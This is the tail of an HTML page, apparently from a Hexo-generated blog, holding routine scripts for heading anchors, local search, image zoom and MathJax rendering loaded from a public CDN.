      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
